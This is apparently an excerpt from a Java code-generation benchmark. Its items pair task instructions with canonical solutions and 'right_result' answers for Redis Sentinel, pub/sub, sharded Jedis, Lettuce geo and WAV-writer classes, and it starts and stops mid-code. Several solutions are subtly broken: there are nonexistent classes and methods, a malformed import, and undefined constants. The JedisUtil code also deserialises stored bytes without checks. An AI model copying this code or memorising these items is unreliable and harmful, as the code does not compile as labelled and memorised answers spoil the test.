{\n            throw new RuntimeException(e);\n        }\n    }\n\n    @Override\n    protected void initPool() throws Exception {\n        initPoolLock.lock();\n        try {\n            HostAndPort master = initSentinels(sentinels, masterName);\n            initMaster(master);\n            for (HostAndPort sentinel : sentinels) {\n                MasterListener listener = new MasterListener(masterName, sentinel.getHost(), sentinel.getPort());\n                masterListeners.add(listener);\n                Thread thread = new Thread(listener);\n                thread.setDaemon(true);\n                thread.start();\n            }\n        } finally {\n            initPoolLock.unlock();\n        }\n    }\n\n    protected void initMaster(HostAndPort master) {\n        currentHostMaster = master;\n        super.initPool();\n    }\n\n    protected HostAndPort initSentinels(Set<HostAndPort> sentinels, String masterName) {\n        HostAndPort master = null;\n        for (HostAndPort sentinel : sentinels) {\n            Jedis jedis = null;\n            try {\n                jedis = new Jedis(sentinel.getHost(), sentinel.getPort(), sentinelClientConfig);\n                List<String> list = jedis.sentinelGetMasterAddrByName(masterName);\n                if (list != null && !list.isEmpty()) {\n                    master = toHostAndPort(list);\n                    break;\n                }\n            } catch (JedisConnectionException e) {\n                LOG.warn(\"Cannot connect to sentinel running @ \" + sentinel, e);\n            } finally {\n                if (jedis != null) {\n                    jedis.close();\n                }\n            }\n        }\n        if (master == null) {\n            throw new JedisConnectionException(\"No way to dispatch this command to Redis. Are you connected not to sentinel?\");\n        }\n        return master;\n    }\n\n    protected HostAndPort toHostAndPort(List<String> parts) {\n        if (parts.size() < 2) {\n            throw new IllegalArgumentException(\"Invalid response from sentinel: \" + parts);\n        }\n        String host = parts.get(0);\n        int port = Integer.parseInt(parts.get(1));\n        return new HostAndPort(host, port);\n    }\n\n    @Override\n    public Jedis getResource() {\n        while (true) {\n            HostAndPort master = currentHostMaster;\n            if (master == null) {\n                try {\n                    Thread.sleep(100);\n                } catch (InterruptedException e) {\n                    Thread.currentThread().interrupt();\n                    throw new JedisConnectionException(\"Interrupted while waiting for master to be initialized\", e);\n                }\n                continue;\n            }\n            try {\n                Jedis jedis = factory.createResource(master.getHost(), master.getPort(), sentinelClientConfig);\n                if (jedis.isConnected()) {\n                    return jedis;\n                } else {\n                    LOG.error(\"Failed to create a connection to {}\", master);\n                    continue;\n                }\n            } catch (JedisConnectionException e) {\n                LOG.error(\"Failed to get resource from pool\", e);\n                // Trigger reinit of the pool by updating the master\n                initPool();\n            }\n        }\n    }\n\n    @Override\n    public void returnResource(Jedis resource) {\n        if (resource != null) {\n            boolean broken = false;\n            try {\n                if (!resource.isBroken() && resource.isConnected()) {\n                    getResourcePool().returnObject(resource);\n                } else {\n                    broken = true;\n                }\n            } finally {\n                if (broken) {\n                    destroyResource(resource);\n                }\n            }\n        }\n    }\n\n    class MasterListener implements Runnable {\n        private final String masterName;\n        private final String host;\n        private final int port;\n        private final long subscribeRetryWaitTimeMillis = 5000;\n        private volatile AtomicBoolean running = new AtomicBoolean(true);\n\n        MasterListener(String masterName, String host, int port) {\n            this.masterName = masterName;\n            this.host = host;\n            this.port = port;\n        }\n\n        public void run() {\n            while (running.get()) {\n                Jedis jedis = null;\n                try {\n                    jedis = new Jedis(host, port, sentinelClientConfig);\n                    jedis.subscribe(new ResponseCallback(), \"__sentinel__:hello\");\n                } catch (JedisConnectionException e) {\n                    LOG.warn(\"Lost connection to Sentinel at {}:{}. Trying reconnect...\", host, port, e);\n                    try {\n                        Thread.sleep(subscribeRetryWaitTimeMillis);\n                    } catch (InterruptedException ie) {\n                        Thread.currentThread().interrupt();\n                        return;\n                    }\n                } finally {\n                    if (jedis != null) {\n                        jedis.close();\n                    }\n                }\n            }\n        }\n\n        public void shutdown() {\n            running.set(false);\n        }\n\n        class ResponseCallback extends Jedis.RedisOutputStream {\n\n            @Override\n            public void onMessage(String channel, byte[] message) {\n                try {\n                    List<String> parts = parse(message);\n                    if (parts.size() >= 3 && parts.get(0).equals(masterName)) {\n                        String ip = parts.get(1);\n                        int port = Integer.parseInt(parts.get(2));\n                        HostAndPort newMaster = new HostAndPort(ip, port);\n                        if (!newMaster.equals(currentHostMaster)) {\n                            LOG.info(\"Master for {} switched from {} to {}, starting update process.\", masterName, currentHostMaster, newMaster);\n                            initMaster(newMaster);\n                        }\n                    }\n                } catch (Exception e) {\n                    LOG.error(\"Error parsing message from Sentinel\", e);\n                }\n            }\n\n            private List<String> parse(byte[] message) {\n                try {\n                    String str = new String(message);\n                    return new URI(str).getPath().split(\"/\");\n                } catch (URISyntaxException e) {\n                    LOG.error(\"Invalid message format from Sentinel\", e);\n                    return null;\n                }\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 334,
    "Instruction": "Task Description: Implement a Redis Pub/Sub manager class in Java that handles publishing and subscribing to Redis channels, including connection management and resource cleanup.\n\nClass Description: RedisPubSubManager is a class that manages Redis publish/subscribe operations using a connection pool. It provides methods to start subscribers and publishers on a specified channel, and handles connection lifecycle management.\n\nAttributes:\n- jedisPool: JedisPool - The connection pool for Redis connections\n- channelName: String - The name of the channel to publish/subscribe to\n- logger: Logger - Logger instance for logging operations and errors\n\nMethods:\n- RedisPubSubManager(String host, int port, String channelName) -> void - Constructor that initializes the Redis connection pool with the specified host, port, and channel name\n- startSubscriber(Subscriber subscriber) -> void - Starts a subscriber thread that listens to messages on the configured channel using the provided subscriber implementation\n- startPublisher() -> void - Starts a publisher that can send messages to the configured channel\n- shutdown() -> void - Closes the connection pool and releases all resources",
    "Canonical_solution": "import com.github.ltsopensource.core.logger.Logger;\nimport com.github.ltsopensource.core.logger.LoggerFactory;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\n\npublic class RedisPubSubManager {\n\n    private static final Logger logger = LoggerFactory.getLogger(RedisPubSubManager.class);\n    private final JedisPool jedisPool;\n    private final String channelName;\n\n    public RedisPubSubManager(String host, int port, String channelName) {\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        this.jedisPool = new JedisPool(poolConfig, host, port, 0);\n        this.channelName = channelName;\n    }\n\n    public void startSubscriber(Subscriber subscriber) {\n        Jedis subscriberJedis = jedisPool.getResource();\n        new Thread(() -> {\n            try {\n                logger.info(\"Subscribing to \\\"\" + channelName + \"\\\". This thread will be blocked.\");\n                subscriberJedis.subscribe(subscriber, channelName);\n                logger.info(\"Subscription ended.\");\n            } catch (Exception e) {\n                logger.error(\"Subscribing failed.\", e);\n            } finally {\n                subscriberJedis.close();\n            }\n        }).start();\n    }\n\n    public void startPublisher() {\n        Jedis publisherJedis = jedisPool.getResource();\n        new Publisher(publisherJedis, channelName).start();\n        publisherJedis.close();\n    }\n\n    public void shutdown() {\n        jedisPool.destroy();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\nimport redis.clients.jedisPubSub;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class RedisPubSubManager {\n    private final JedisPool jedisPool;\n    private final String channelName;\n    private final Logger logger = LoggerFactory.getLogger(RedisPubSubManager.class);\n\n    public RedisPubSubManager(String host, int port, String channelName) {\n        this.channelName = channelName;\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        this.jedisPool = new JedisPool(poolConfig, host, port);\n    }\n\n    public void startSubscriber(Subscriber subscriber) {\n        new Thread(() -> {\n            try (Jedis jedis = jedisPool.getResource()) {\n                jedis.subscribe(subscriber, channelName);\n            } catch (Exception e) {\n                logger.error(\"Error while subscribing to Redis channel\", e);\n            }\n        }).start();\n    }\n\n    public void startPublisher() {\n        new Thread(() -> {\n            try (Jedis jedis = jedisPool.getResource()) {\n                while (!Thread.currentThread().isInterrupted()) {\n                    String message = \"Test Message\";\n                    jedis.publish(channelName, message);\n                    logger.info(\"Published message: {}\", message);\n                    Thread.sleep(5000);\n                }\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n                logger.warn(\"Publisher thread interrupted\");\n            } catch (Exception e) {\n                logger.error(\"Error while publishing to Redis channel\", e);\n            }\n        }).start();\n    }\n\n    public void shutdown() {\n        if (jedisPool != null) {\n            jedisPool.close();\n            logger.info(\"Redis connection pool closed\");\n        }\n    }\n\n    public static class Subscriber extends JedisPubSub {\n        @Override\n        public void onMessage(String channel, String message) {\n            System.out.println(\"Received message from channel [\" + channel + \"]: \" + message);\n        }\n\n        @Override\n        public void onSubscribe(String channel, int subscribedChannels) {\n            System.out.println(\"Subscribed to channel: \" + channel + \", total subscriptions: \" + subscribedChannels);\n        }\n\n        @Override\n        public void onUnsubscribe(String channel, int subscribedChannels) {\n            System.out.println(\"Unsubscribed from channel: \" + channel + \", remaining subscriptions: \" + subscribedChannels);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 336,
    "Instruction": "Task Description: Create a Java utility class for interacting with Redis using sharded connections, providing thread-safe initialization, connection pooling, and basic CRUD operations for both string and object values.\n\nClass Description: JedisUtil is a utility class that manages Redis connections using Jedis sharding with connection pooling. It provides methods for storing and retrieving both string and serialized object values with expiration support.\n\nAttributes:\n- logger: Logger - SLF4J logger for logging messages\n- address: String - Comma-separated Redis server addresses\n- shardedJedisPool: ShardedJedisPool - Pool of sharded Redis connections\n- INSTANCE_INIT_LOCL: ReentrantLock - Lock for thread-safe initialization\n\nMethods:\n- init(String address) -> void - Initializes the Redis connection pool with the given addresses\n- getInstance() -> ShardedJedis - Returns a sharded Redis connection instance (thread-safe initialization)\n- close() -> void - Closes the Redis connection pool and releases resources\n- serialize(Object object) -> byte[] - Serializes a Java object to byte array\n- unserialize(byte[] bytes) -> Object - Deserializes a byte array back to a Java object\n- setStringValue(String key, String value, int seconds) -> String - Stores a string value in Redis with expiration time\n- setObjectValue(String key, Object obj, int seconds) -> String - Stores a serialized object in Redis with expiration time\n- getStringValue(String key) -> String - Retrieves a string value from Redis\n- getObjectValue(String key) -> Object - Retrieves and deserializes an object from Redis",
    "Canonical_solution": "import org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport redis.clients.jedis.JedisPoolConfig;\nimport redis.clients.jedis.JedisShardInfo;\nimport redis.clients.jedis.ShardedJedis;\nimport redis.clients.jedis.ShardedJedisPool;\n\nimport java.io.*;\nimport java.util.LinkedList;\nimport java.util.List;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class JedisUtil {\n    private static Logger logger = LoggerFactory.getLogger(JedisUtil.class);\n    private static String address;\n    private static ShardedJedisPool shardedJedisPool;\n    private static ReentrantLock INSTANCE_INIT_LOCL = new ReentrantLock(false);\n\n    public static void init(String address) {\n        JedisUtil.address = address;\n        getInstance();\n    }\n\n    private static ShardedJedis getInstance() {\n        if (shardedJedisPool == null) {\n            try {\n                if (INSTANCE_INIT_LOCL.tryLock(2, TimeUnit.SECONDS)) {\n                    try {\n                        if (shardedJedisPool == null) {\n                            JedisPoolConfig config = new JedisPoolConfig();\n                            config.setMaxTotal(200);\n                            config.setMaxIdle(50);\n                            config.setMinIdle(8);\n                            config.setMaxWaitMillis(10000);\n                            config.setTestOnBorrow(true);\n                            config.setTestOnReturn(false);\n                            config.setTestWhileIdle(true);\n                            config.setTimeBetweenEvictionRunsMillis(30000);\n                            config.setNumTestsPerEvictionRun(10);\n                            config.setMinEvictableIdleTimeMillis(60000);\n\n                            List<JedisShardInfo> jedisShardInfos = new LinkedList<JedisShardInfo>();\n                            String[] addressArr = address.split(\",\");\n                            for (int i = 0; i < addressArr.length; i++) {\n                                JedisShardInfo jedisShardInfo = new JedisShardInfo(addressArr[i]);\n                                jedisShardInfos.add(jedisShardInfo);\n                            }\n                            shardedJedisPool = new ShardedJedisPool(config, jedisShardInfos);\n                            logger.info(\">>>>>>>>>>> xxl-sso, JedisUtil.ShardedJedisPool init success.\");\n                        }\n                    } finally {\n                        INSTANCE_INIT_LOCL.unlock();\n                    }\n                }\n            } catch (InterruptedException e) {\n                logger.error(e.getMessage(), e);\n            }\n        }\n\n        if (shardedJedisPool == null) {\n            throw new NullPointerException(\">>>>>>>>>>> xxl-sso, JedisUtil.ShardedJedisPool is null.\");\n        }\n\n        return shardedJedisPool.getResource();\n    }\n\n    public static void close() throws IOException {\n        if(shardedJedisPool != null) {\n            shardedJedisPool.close();\n        }\n    }\n\n    private static byte[] serialize(Object object) {\n        ObjectOutputStream oos = null;\n        ByteArrayOutputStream baos = null;\n        try {\n            baos = new ByteArrayOutputStream();\n            oos = new ObjectOutputStream(baos);\n            oos.writeObject(object);\n            return baos.toByteArray();\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n        } finally {\n            try {\n                if (oos != null) oos.close();\n                if (baos != null) baos.close();\n            } catch (IOException e) {\n                logger.error(e.getMessage(), e);\n            }\n        }\n        return null;\n    }\n\n    private static Object unserialize(byte[] bytes) {\n        ByteArrayInputStream bais = null;\n        try {\n            bais = new ByteArrayInputStream(bytes);\n            ObjectInputStream ois = new ObjectInputStream(bais);\n            return ois.readObject();\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n        } finally {\n            try {\n                if (bais != null) bais.close();\n            } catch (IOException e) {\n                logger.error(e.getMessage(), e);\n            }\n        }\n        return null;\n    }\n\n    public static String setStringValue(String key, String value, int seconds) {\n        String result = null;\n        ShardedJedis client = getInstance();\n        try {\n            result = client.setex(key, seconds, value);\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n        } finally {\n            if (client != null) {\n                client.close();\n            }\n        }\n        return result;\n    }\n\n    public static String setObjectValue(String key, Object obj, int seconds) {\n        String result = null;\n        ShardedJedis client = getInstance();\n        try {\n            result = client.setex(key.getBytes(), seconds, serialize(obj));\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n        } finally {\n            if (client != null) {\n                client.close();\n            }\n        }\n        return result;\n    }\n\n    public static String getStringValue(String key) {\n        String value = null;\n        ShardedJedis client = getInstance();\n        try {\n            value = client.get(key);\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n        } finally {\n            if (client != null) {\n                client.close();\n            }\n        }\n        return value;\n    }\n\n    public static Object getObjectValue(String key) {\n        Object obj = null;\n        ShardedJedis client = getInstance();\n        try {\n            byte[] bytes = client.get(key.getBytes());\n            if (bytes != null && bytes.length > 0) {\n                obj = unserialize(bytes);\n            }\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n        } finally {\n            if (client != null) {\n                client.close();\n            }\n        }\n        return obj;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport org.slf4j.Logger;\nimport redis.clients.jedis.ShardedJedis;\nimport redis.clients.jedis.ShardedJedisPool;\nimport redis.clients.jedis.JedisShardInfo;\nimport redis.clients.util.Pool;\n\nimport java.io.*;\nimport java.nio.charset.StandardCharsets;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class JedisUtil {\n    private static final Logger logger = org.slf4j.LoggerFactory.getLogger(JedisUtil.class);\n    private static String address;\n    private static ShardedJedisPool shardedJedisPool;\n    private static final ReentrantLock INSTANCE_INIT_LOCK = new ReentrantLock();\n\n    public void init(String address) {\n        this.address = address;\n        List<JedisShardInfo> shards = new ArrayList<>();\n        for (String addr : address.split(\",\")) {\n            String[] parts = addr.trim().split(\":\");\n            if (parts.length != 2) {\n                logger.error(\"Invalid Redis address format: {}\", addr);\n                continue;\n            }\n            String host = parts[0];\n            int port = Integer.parseInt(parts[1]);\n            shards.add(new JedisShardInfo(host, port));\n        }\n\n        shardedJedisPool = new ShardedJedisPool(shards);\n        logger.info(\"Redis connection pool initialized with {} shards.\", shards.size());\n    }\n\n    public static ShardedJedis getInstance() {\n        if (shardedJedisPool == null) {\n            INSTANCE_INIT_LOCK.lock();\n            try {\n                if (shardedJedisPool == null) {\n                    logger.warn(\"Redis connection pool is not initialized. Please call init() before using.\");\n                }\n            } finally {\n                INSTANCE_INIT_LOCK.unlock();\n            }\n        }\n        return shardedJedisPool.getResource();\n    }\n\n    public void close() {\n        if (shardedJedisPool != null) {\n            shardedJedisPool.destroy();\n            logger.info(\"Redis connection pool closed.\");\n        }\n    }\n\n    private byte[] serialize(Object object) {\n        if (object == null) {\n            return null;\n        }\n        try (ByteArrayOutputStream bos = new ByteArrayOutputStream();\n             ObjectOutputStream oos = new ObjectOutputStream(bos)) {\n            oos.writeObject(object);\n            return bos.toByteArray();\n        } catch (IOException e) {\n            logger.error(\"Failed to serialize object\", e);\n            return null;\n        }\n    }\n\n    private Object unserialize(byte[] bytes) {\n        if (bytes == null) {\n            return null;\n        }\n        try (ByteArrayInputStream bis = new ByteArrayInputStream(bytes);\n             ObjectInputStream ois = new ObjectInputStream(bis)) {\n            return ois.readObject();\n        } catch (Exception e) {\n            logger.error(\"Failed to deserialize object\", e);\n            return null;\n        }\n    }\n\n    public String setStringValue(String key, String value, int seconds) {\n        ShardedJedis jedis = null;\n        try {\n            jedis = getInstance();\n            if (seconds > 0) {\n                return jedis.setex(key, seconds, value);\n            } else {\n                return jedis.set(key, value);\n            }\n        } finally {\n            if (jedis != null) {\n                jedis.close();\n            }\n        }\n    }\n\n    public String setObjectValue(String key, Object obj, int seconds) {\n        byte[] serialized = serialize(obj);\n        if (serialized == null) {\n            return \"ERROR\";\n        }\n        ShardedJedis jedis = null;\n        try {\n            jedis = getInstance();\n            if (seconds > 0) {\n                return jedis.setex(key.getBytes(StandardCharsets.UTF_8), seconds, serialized);\n            } else {\n                return jedis.set(key.getBytes(StandardCharsets.UTF_8), serialized);\n            }\n        } finally {\n            if (jedis != null) {\n                jedis.close();\n            }\n        }\n    }\n\n    public String getStringValue(String key) {\n        ShardedJedis jedis = null;\n        try {\n            jedis = getInstance();\n            return jedis.get(key);\n        } finally {\n            if (jedis != null) {\n                jedis.close();\n            }\n        }\n    }\n\n    public Object getObjectValue(String key) {\n        ShardedJedis jedis = null;\n        try {\n            jedis = getInstance();\n            byte[] data = jedis.get(key.getBytes(StandardCharsets.UTF_8));\n            return unserialize(data);\n        } finally {\n            if (jedis != null) {\n                jedis.close();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 337,
    "Instruction": "Task Description: Create a Java class that provides geospatial operations using Redis, including adding locations, querying locations within a radius, calculating distances between locations, and retrieving position coordinates.\n\nClass Description: The RedisGeoOperations class encapsulates Redis geospatial commands using the Lettuce client. It manages Redis connections and provides methods for common geospatial operations.\n\nAttributes:\n- redisClient: RedisClient - The main Redis client instance for connection management\n- redisCommands: RedisCommands<String, String> - Synchronous Redis command interface for executing operations\n\nMethods:\n- RedisGeoOperations(String host, int port) -> void - Constructor that initializes the Redis client with specified host and port\n- addGeoLocation(String key, double longitude, double latitude, String member) -> void - Adds a geospatial member with coordinates to the specified key\n- getGeoRadius(String key, double longitude, double latitude, double radius, GeoArgs.Unit unit) -> Set<String> - Returns members within given radius of a point\n- getGeoDistance(String key, String member1, String member2, GeoArgs.Unit unit) -> Double - Calculates distance between two members in specified units\n- getGeoRadiusWithArgs(String key, double longitude, double latitude, double radius, GeoArgs.Unit unit, GeoArgs geoArgs) -> List<GeoWithin<String>> - Returns members within radius with additional options (like distance or coordinates)\n- getGeoPositions(String key, String... members) -> List<GeoCoordinates> - Returns coordinates for specified members\n- closeConnection() -> void - Properly closes Redis connection and shuts down client",
    "Canonical_solution": "import io.lettuce.core.*;\nimport io.lettuce.core.api.sync.RedisCommands;\n\npublic class RedisGeoOperations {\n\n    private RedisClient redisClient;\n    private RedisCommands<String, String> redisCommands;\n\n    public RedisGeoOperations(String host, int port) {\n        this.redisClient = RedisClient.create(RedisURI.Builder.redis(host, port).build());\n        this.redisCommands = redisClient.connect().sync();\n    }\n\n    public void addGeoLocation(String key, double longitude, double latitude, String member) {\n        redisCommands.geoadd(key, longitude, latitude, member);\n    }\n\n    public Set<String> getGeoRadius(String key, double longitude, double latitude, double radius, GeoArgs.Unit unit) {\n        return redisCommands.georadius(key, longitude, latitude, radius, unit);\n    }\n\n    public Double getGeoDistance(String key, String member1, String member2, GeoArgs.Unit unit) {\n        return redisCommands.geodist(key, member1, member2, unit);\n    }\n\n    public List<GeoWithin<String>> getGeoRadiusWithArgs(String key, double longitude, double latitude, double radius, \n                                                      GeoArgs.Unit unit, GeoArgs geoArgs) {\n        return redisCommands.georadius(key, longitude, latitude, radius, unit, geoArgs);\n    }\n\n    public List<GeoCoordinates> getGeoPositions(String key, String... members) {\n        return redisCommands.geopos(key, members);\n    }\n\n    public void closeConnection() {\n        redisCommands.getStatefulConnection().close();\n        redisClient.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport io.lettuce.core.*;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport io.lettuce.core.geo.GeoArgs;\nimport io.lettuce.core.geo.GeoCoordinates;\nimport io.lettuce.core.geo.GeoWithin;\n\nimport java.util.List;\nimport java.util.Set;\n\npublic class RedisGeoOperations {\n\n    private final RedisClient redisClient;\n    private final RedisCommands<String, String> redisCommands;\n\n    public RedisGeoOperations(String host, int port) {\n        redisClient = RedisClient.create(\"redis://\" + host + \":\" + port);\n        StatefulRedisConnection<String, String> connection = redisClient.connect();\n        redisCommands = connection.sync();\n    }\n\n    public void addGeoLocation(String key, double longitude, double latitude, String member) {\n        redisCommands.geoadd(key, longitude, latitude, member);\n    }\n\n    public Set<String> getGeoRadius(String key, double longitude, double latitude, double radius, GeoArgs.Unit unit) {\n        return redisCommands.georadius(key, longitude, latitude, radius, unit);\n    }\n\n    public Double getGeoDistance(String key, String member1, String member2, GeoArgs.Unit unit) {\n        return redisCommands.geodist(key, member1, member2, unit);\n    }\n\n    public List<GeoWithin<String>> getGeoRadiusWithArgs(String key, double longitude, double latitude, double radius, GeoArgs.Unit unit, GeoArgs geoArgs) {\n        return redisCommands.georadiusWith(key, longitude, latitude, radius, unit, geoArgs);\n    }\n\n    public List<GeoCoordinates> getGeoPositions(String key, String... members) {\n        return redisCommands.geopos(key, members);\n    }\n\n    public void closeConnection() {\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 34,
    "Instruction": "Task Description: Implement a Java class for writing WAV audio files with support for file rollover when reaching maximum size limits, using Java NIO's FileChannel for efficient file operations.\n\nClass Description: WaveWriter is a class that handles the creation and writing of WAV audio files. It manages file channels, buffers, and WAV file formatting while supporting automatic file rollover when files reach a specified maximum size. The class implements AutoCloseable for proper resource management.\n\nAttributes:\n- mAudioFormat: [AudioFormat] - The audio format specification for the WAV file\n- mFileRolloverCounter: [int] - Counter for tracking rolled-over file versions\n- mMaxSize: [long] - Maximum allowed file size before rollover (0 means no limit)\n- mFile: [Path] - Current file path being written to\n- mFileChannel: [FileChannel] - NIO file channel for file operations\n- mDataChunkOpen: [boolean] - Flag indicating if a data chunk is currently open\n- mDataChunkSizeOffset: [long] - File position of the data chunk size field\n- mDataChunkSize: [int] - Current size of the data chunk in bytes\n\nMethods:\n- WaveWriter: [constructor](AudioFormat format, Path file, long maxSize) -> [void] - Initializes a new WaveWriter with specified format, output file, and maximum size\n- WaveWriter: [constructor](AudioFormat format, Path file) -> [void] - Initializes a new WaveWriter with no maximum size limit\n- open: [private]() -> [void] - Opens a new file channel and writes initial WAV header\n- close: [public]() -> [void] - Closes the file channel and performs cleanup\n- close: [public](Path path) -> [void] - Closes the file channel and renames the file to the specified path\n- writeData: [public](ByteBuffer buffer) -> [void] - Writes audio data to the file, handling rollover if needed\n- closeDataChunk: [private]() -> [void] - Marks the current data chunk as closed\n- openDataChunk: [private]() -> [void] - Opens a new data chunk in the WAV file\n- rollover: [private]() -> [void] - Performs file rollover operation when reaching size limit\n- updateTotalSize: [private]() -> [void] - Updates the total file size in the WAV header\n- updateDataChunkSize: [private]() -> [void] - Updates the data chunk size in the WAV file\n- getUnsignedIntegerBuffer: [protected static](long size) -> [ByteBuffer] - Creates a buffer with unsigned integer representation\n- updateFileName: [private]() -> [void] - Updates the filename for rollover operations\n- getDataHeader: [public static]() -> [ByteBuffer] - Creates a data chunk header buffer\n- getWaveHeader: [public static](AudioFormat format) -> [ByteBuffer] - Creates a WAV file header buffer\n- getFormatChunk: [public static](AudioFormat format) -> [ByteBuffer] - Creates a format chunk buffer for WAV file",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.ByteOrder;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardOpenOption;\nimport java.util.Arrays;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\nimport javax.sound.sampled.AudioFormat;\n\npublic class WaveWriter implements AutoCloseable\n{\n    private static final Pattern FILENAME_PATTERN = Pattern.compile(\"(.*_)(\\\\d+)(\\\\.tmp)\");\n    private AudioFormat mAudioFormat;\n    private int mFileRolloverCounter = 1;\n    private long mMaxSize;\n    private Path mFile;\n    private FileChannel mFileChannel;\n    private boolean mDataChunkOpen = false;\n    private long mDataChunkSizeOffset = 0;\n    private int mDataChunkSize = 0;\n\n    public WaveWriter(AudioFormat format, Path file, long maxSize) throws IOException\n    {\n        mAudioFormat = format;\n        mFile = file;\n        mMaxSize = maxSize;\n        open();\n    }\n\n    public WaveWriter(AudioFormat format, Path file) throws IOException\n    {\n        this(format, file, 0);\n    }\n\n    private void open() throws IOException\n    {\n        int version = 2;\n        while(Files.exists(mFile) && version < 20)\n        {\n            mFile = Paths.get(mFile.toFile().getAbsolutePath().replace(\".tmp\", \"_\" + version + \".tmp\"));\n            version++;\n        }\n        mFileChannel = (FileChannel.open(mFile, StandardOpenOption.WRITE, StandardOpenOption.CREATE_NEW));\n        ByteBuffer header = getWaveHeader(mAudioFormat);\n        while(header.hasRemaining())\n        {\n            mFileChannel.write(header);\n        }\n    }\n\n    public void close() throws IOException\n    {\n        close(null);\n    }\n\n    public void close(Path path) throws IOException\n    {\n        mFileChannel.force(true);\n        mFileChannel.close();\n        rename(path);\n    }\n\n    public void writeData(ByteBuffer buffer) throws IOException\n    {\n        buffer.position(0);\n        openDataChunk();\n        if(mFileChannel.size() + buffer.capacity() < mMaxSize)\n        {\n            while(buffer.hasRemaining())\n            {\n                mDataChunkSize += mFileChannel.write(buffer);\n            }\n            updateTotalSize();\n            updateDataChunkSize();\n        }\n        else\n        {\n            int remaining = (int)(mMaxSize - mFileChannel.size());\n            remaining -= (int)(remaining % mAudioFormat.getFrameSize());\n            byte[] bytes = buffer.array();\n            ByteBuffer current = ByteBuffer.wrap(Arrays.copyOf(bytes, remaining));\n            ByteBuffer next = ByteBuffer.wrap(Arrays.copyOfRange(bytes, remaining, bytes.length));\n            while(current.hasRemaining())\n            {\n                mDataChunkSize += mFileChannel.write(current);\n            }\n            updateTotalSize();\n            updateDataChunkSize();\n            rollover();\n            openDataChunk();\n            while(next.hasRemaining())\n            {\n                mDataChunkSize += mFileChannel.write(next);\n            }\n            updateTotalSize();\n            updateDataChunkSize();\n        }\n    }\n\n    private void closeDataChunk()\n    {\n        mDataChunkOpen = false;\n    }\n\n    private void openDataChunk() throws IOException\n    {\n        if(!mDataChunkOpen)\n        {\n            if(mFileChannel.size() + 32 >= mMaxSize)\n            {\n                rollover();\n            }\n            ByteBuffer formatChunk = getFormatChunk(mAudioFormat);\n            formatChunk.position(0);\n            while(formatChunk.hasRemaining())\n            {\n                mFileChannel.write(formatChunk);\n            }\n            ByteBuffer dataHeader = getDataHeader();\n            dataHeader.position(0);\n            while(dataHeader.hasRemaining())\n            {\n                mFileChannel.write(dataHeader);\n            }\n            mDataChunkSizeOffset = mFileChannel.size() - 4;\n            mDataChunkSize = 0;\n            mDataChunkOpen = true;\n            updateTotalSize();\n        }\n    }\n\n    private void rollover() throws IOException\n    {\n        closeDataChunk();\n        close();\n        mFileRolloverCounter++;\n        updateFileName();\n        open();\n    }\n\n    private void updateTotalSize() throws IOException\n    {\n        ByteBuffer buffer = getUnsignedIntegerBuffer(mFileChannel.size() - 8);\n        mFileChannel.write(buffer, 4);\n    }\n\n    private void updateDataChunkSize() throws IOException\n    {\n        ByteBuffer size = getUnsignedIntegerBuffer(mDataChunkSize);\n        mFileChannel.write(size, mDataChunkSizeOffset);\n    }\n\n    protected static ByteBuffer getUnsignedIntegerBuffer(long size)\n    {\n        ByteBuffer buffer = ByteBuffer.allocate(4);\n        buffer.put((byte)(size & 0xFFl));\n        buffer.put((byte)(Long.rotateRight(size & 0xFF00l, 8)));\n        buffer.put((byte)(Long.rotateRight(size & 0xFF0000l, 16)));\n        buffer.put((byte)Long.rotateRight(Long.rotateRight(size & 0xFF000000l, 16), 8));\n        buffer.position(0);\n        return buffer;\n    }\n\n    private void updateFileName()\n    {\n        String filename = mFile.toString();\n        if(mFileRolloverCounter == 2)\n        {\n            filename = filename.replace(\".tmp\", \"_2.tmp\");\n        }\n        else\n        {\n            Matcher m = FILENAME_PATTERN.matcher(filename);\n            if(m.find())\n            {\n                StringBuilder sb = new StringBuilder();\n                sb.append(m.group(1));\n                sb.append(mFileRolloverCounter);\n                sb.append(m.group(3));\n                filename = sb.toString();\n            }\n        }\n        mFile = Paths.get(filename);\n    }\n\n    public static ByteBuffer getDataHeader()\n    {\n        ByteBuffer header = ByteBuffer.allocate(8);\n        header.put(DATA_CHUNK_ID.getBytes());\n        header.position(0);\n        return header;\n    }\n\n    public static ByteBuffer getWaveHeader(AudioFormat format)\n    {\n        ByteBuffer header = ByteBuffer.allocate(12).order(ByteOrder.LITTLE_ENDIAN);\n        header.put(RIFF_ID.getBytes());\n        header.putInt(INITIAL_TOTAL_LENGTH);\n        header.put(WAVE_ID.getBytes());\n        